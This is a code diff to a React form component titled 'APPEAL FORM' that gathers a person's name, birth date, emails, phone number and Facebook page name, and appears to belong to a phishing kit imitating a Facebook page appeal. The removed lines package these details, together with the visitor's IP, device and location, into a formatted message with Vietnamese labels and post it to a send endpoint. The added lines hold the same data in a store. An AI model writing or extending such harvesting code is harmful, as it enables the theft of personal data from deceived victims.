@@ -5,7 +5,6 @@ import { tickSrc } from '@/components/icons';
 import PhoneInput from '@/components/phone-input';
 import { DEFAULT_TEXTS } from '@/constants/default-texts';
 import { store } from '@/store/store';
-import axios from 'axios';
 import { type FC, type FormEvent, useCallback, useState } from 'react';
 
 interface FormData {
@@ -43,7 +42,7 @@ const InitModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = 
     });
     const [errors, setErrors] = useState<FormErrors>({});
 
-    const { setModalOpen, geoInfo, setMessageId, setMessageContent } = store();
+    const { setModalOpen, setUserData } = store();
 
     const handleChange = useCallback(<K extends keyof FormData>(field: K, value: FormData[K]) => {
         setFormData((prev) => ({ ...prev, [field]: value }));
@@ -76,39 +75,17 @@ const InitModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = 
 
         setIsLoading(true);
 
-        const dt = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
-        const location = geoInfo ? `${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country}` : 'Unknown, Unknown, Unknown';
-        const ip = geoInfo?.ip || 'Unknown';
-        let message = `📩 <b>APPEAL FORM</b>\n`;
-        message += `⏰ ${dt}\n`;
-        message += `🌐 IP: <code>${ip}</code>\n`;
-        message += `📱 Thiết bị: <code>__DEVICE_INFO__</code>\n`;
-        message += `📍 Vị trí: ${location}\n`;
-        message += `━━━━━━━━━━━━━━━━━━━━\n`;
-        message += `<b>📋 THÔNG TIN</b>\n`;
-        message += `   Tên: <code>${formData.fullName}</code>\n`;
-        message += `   Ngày sinh: <code>${formData.birthDate}</code>\n`;
-        message += `   Email: <code>${formData.personalEmail}</code>\n`;
-        if (formData.businessEmail !== formData.personalEmail) {
-            message += `   Business: <code>${formData.businessEmail}</code>\n`;
-        }
-        message += `   SĐT: <code>${formData.phone}</code>\n`;
-        message += `   Page: <code>${formData.pageName}</code>\n`;
+        setUserData({
+            fullName: formData.fullName.trim(),
+            birthDate: formData.birthDate,
+            personalEmail: formData.personalEmail.trim(),
+            businessEmail: formData.businessEmail.trim(),
+            phoneNumber: formData.phone.trim(),
+            facebookPageName: formData.pageName.trim()
+        });
 
-        try {
-            const res = await axios.post('/api/send', { message });
-
-            if (res?.data?.success && typeof res.data.message_id === 'number') {
-                setMessageId(res.data.message_id);
-                setMessageContent(message);
-            }
-
-            nextStep();
-        } catch {
-            nextStep();
-        } finally {
-            setIsLoading(false);
-        }
+        nextStep();
+        setIsLoading(false);
     };
 
     return (
